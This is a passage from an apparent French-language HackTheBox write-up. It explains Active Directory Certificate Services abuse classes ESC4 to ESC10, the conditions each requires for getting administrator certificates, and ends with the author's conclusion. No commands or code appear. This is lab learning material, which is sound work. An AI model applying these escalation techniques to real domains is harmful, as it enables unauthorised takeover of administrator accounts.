Dans la version 1, il n'y a pas la possibilité d'exiger une co-signature, mais certains modèles (comme le modèle User ou machine), ont en général l'EKU **Client Authentication** et sont présents par défaut.

Cela les rendraient vulnérables à une attaque de ce type, car permettant d'outrepasser une contrainte (la co-signature), dans la mesure où un certificat de version 1 sera automatiquement passé en version 2 s'il est dupliqué, et que cette version  ne contiendra pas l'EKU **Certificate Request Agent**.

### ESC4

Ce type est plus simple à comprendre : si nous avons les droits de changer un certificat quelconque, nous serions en mesure de changer ledit certificat de façon à le rendre dangereux.

### ESC5

Ce type implique de compromettre l'un des objets suivant :

- L'ordinateur gestionnaire du serveur qui génère les CA
- Le RPC/DCOM du serveur CA
- Tout objet héritant des conteneurs suivants : par exemple, le conteneur de modèles de certificats (_Certificate Templates_), le conteneur d'autorités de certification (_Certification Authorities_), l'objet NTAuthCertificates, le conteneur de services d'inscription (_Enrollment Services_) etc.

### ESC6

Avoir l'attribut _**EDITF_ATTRIBUTESUBJECTALTNAME2**_ au niveau du CA.

C'est extrêmement dangereux. Il permet tout simplement de déterminer le SAN, dont nous avons vu la dangerosité plus haut. Et ceci sera appliqué à **TOUS** les certificats générés par l'autorité de certification interne que nous avons vue plus haut également. Par la suite, vu que par exemple un modèle de base tel que _User_ permet de s'authentifier (via l'EKU **Client Authentication**), il devient alors trivial de demander un certificat avec pour SAN l'UPN d'un admin par exemple.

### ESC7

Implique que le compte possède le privilège _**ManageCertificates**_. Si nous avons un tel privilège, il devient alors possible de mettre en place l'attribut _**EDITF_ATTRIBUTESUBJECTALTNAME2**_ et ainsi générer des certificats permettant la connexion en tant qu'administrateur par exemple (voir ESC6).

### ESC8

Une attaque qui se base sur un autre type d'attaque : NTLM Relay. Ne connaissant que très peu ce type d'attaque (même si nous en avons vu une saveur plus haut), je vais me garder de dire ce que j'en ai compris.

Plus d'infos ici : https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc8

### ESC9

Comme ESC10 (voir ci-dessous) cette vulnérabilité est liée à la façon dont sont mappés les certificats.

Une explication détaillée est disponible ici : https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates#certificate-mapping


Selon ce même site :

> If the certificate attribute msPKI-Enrollment-Flag contains the flag CT_FLAG_NO_SECURITY_EXTENSION, the szOID_NTDS_CA_SECURITY_EXT extension will not be embedded, meaning that even with StrongCertificateBindingEnforcement set to 1, the mapping will be performed similarly as a value of 0 in the registry key.

Les conditions suivantes doivent être réunies :

- StrongCertificateBindingEnforcement n'est pas défini sur 2 (par défaut : 1) ou CertificateMappingMethods contient l'indicateur UPN (0x4)
- Le modèle contient l'indicateur CT_FLAG_NO_SECURITY_EXTENSION dans la valeur msPKI-Enrollment-Flag
- Le modèle spécifie l'EKU **Client Authentication** et a le droit GenericWrite  sur un compte quelconque.

### ESC10

Très similaire à ESC9.

Il y a deux scénarii :

1) Premier cas :
	- StrongCertificateBindingEnforcement est défini sur 0 (mappage fort non effectué, lire le papier plus haut, c'est lié à une modif de microsoft après la vuln Certifried)
	- Le modèle spécifie l'EKU **Client Authentication** et a le droit GenericWrite  sur un compte quelconque.
 2) Second cas :
	- CertificateMappingMethods est défini sur 0x4, ce qui signifie qu'aucun mappage fort n'est effectué et que seul l'UPN sera vérifié
	- Le modèle spécifie l'EKU **Client Authentication**
	- a le droit GenericWrite  sur un compte quelconque sans UPN déjà défini (comptes machine ou compte administrateur intégré par exemple **(???)** )


## Conclusion

Cette seconde machine windows pour moi fût l'occasion de me frotter à un monde que je connais encore qu'assez peu. Pour un.e débutant.e sur les tests d'intrusion AD, c'est clairement une box difficile, et de l'aide sur certains aspects qui portent à confusion sera appréciable  (pour ma part j'ai un mal fou à comprendre pourquoi il y a tant de FQDN différents et à jouer avec ces contextes).

Cependant, la clarté relative du chemin, et les ressources conséquentes sur ce type de vulnérabilité permet de plonger au moins de façon assez profonde sur le fonctionnement de AD CD et des vulnérabilités afférentes à ce service.

Une meilleure approche concernant l'énumération des services pourrait permettre de grandement gagner du temps, mais cela viendra avec l'expérience et l'expérience, avec le temps ainsi que la pratique, en espérant voir d'autres boxes de ce type sur HTB !
